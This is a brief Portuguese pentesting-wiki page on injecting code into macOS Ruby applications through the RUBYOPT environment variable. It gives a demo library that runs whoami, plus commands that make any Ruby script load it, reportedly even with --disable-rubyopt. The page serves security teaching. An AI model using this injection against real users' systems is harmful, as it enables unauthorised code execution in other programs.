# Injeção em aplicações Ruby do macOS

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Usando esta env variable, é possível **adicionar novos parâmetros** ao **ruby** sempre que ele é executado. Embora o parâmetro **`-e`** não possa ser usado para especificar código ruby a ser executado, é possível usar os parâmetros **`-I`** e **`-r`** para adicionar uma nova pasta ao caminho das libraries a serem carregadas e, em seguida, **especificar uma library para carregar**.

Crie a library **`inject.rb`** em **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Crie em qualquer lugar um script Ruby como:
```ruby:hello.rb
puts 'Hello, World!'
```
Em seguida, faça um script Ruby arbitrário carregá-lo com:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Curiosidade, funciona mesmo com o parâmetro **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
